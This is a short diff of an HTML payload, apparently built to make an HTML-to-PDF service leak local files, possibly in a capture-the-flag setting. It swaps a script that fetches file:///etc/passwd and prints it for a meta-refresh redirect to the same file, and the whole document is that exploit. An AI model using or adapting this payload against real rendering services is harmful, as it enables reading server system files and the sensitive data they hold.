@@ -1,17 +1,9 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <meta http-equiv="refresh" content="0; url=file:///etc/passwd">
+  </head>
   <body>
-    <h1>PDFy file leak attempt</h1>
-    <pre id="output">Loading...</pre>
-    <script>
-      fetch("file:///etc/passwd")
-        .then(r => r.text())
-        .then(t => {
-          document.getElementById("output").innerText = t;
-        })
-        .catch(e => {
-          document.getElementById("output").innerText = "Error: " + e;
-        });
-    </script>
+    <p>If you see this, redirect failed.</p>
   </body>
 </html>
